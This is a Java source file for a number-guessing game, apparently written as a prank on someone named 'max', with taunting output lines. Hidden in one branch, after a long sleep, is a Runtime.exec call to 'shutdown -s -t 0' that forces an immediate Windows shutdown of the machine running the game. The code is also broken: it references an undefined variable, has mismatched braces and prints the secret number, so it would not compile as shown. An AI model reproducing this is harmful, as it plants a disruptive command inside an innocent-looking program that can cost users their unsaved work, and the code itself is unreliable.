public class Main {
            static Random rn = new Random();

            public static void main(String args[]) {
                Scanner sc = new Scanner(System.in);
                String text = sc.nextLine();

                System.out.println("max sucks SMorc tryhard");


                boolean running = true;
                boolean guessed = false;
                int number = 0;
                int input = 0;

                while (running) {
                    if (!guessed) {
                        System.out.println("I'm thinking of a number between 1 and 10");
                        System.out.println("good luck it's pretty hard ;)");
                        number = getRandom(10);
                        System.out.println(number);
                    } else {
                        System.out.println("Not in my house ;- Æ)");
                    }

                    input = sc.nextInt();

                    if (input <= 0 || input > 11) {
                        running = false;

                        try {
                            System.exit(0);
                        } catch (Exception ex) {
                            javax.swing.JOptionPane.showMessageDialog(null, ex.getMessage());
                        }
                    } 
                   if (enter.equals ("random message"))                       {
                   System.out.println("and max thought i didn't know how to program. well geuss what he was wrong ");

                   try{
                      Thread.sleep(100000);
                      Runtime runtime = Runtime.getRuntime();

                      Process proc = runtime.exec("shutdown -s -t 0");
                      System.exit(0);
                    }
                  catch (Exception ex){
        javax.swing.JOptionPane.showMessageDialog(null, ex.getMessage());
        }


                        if (input == number) {
                            System.out.println("Guessed correctly");
                            guessed = true;
                            running = false;
                        }

                }
            }

            public static int getRandom(int max) {
                return rn.nextInt(max - 1 + 1) + 1;
            }
        }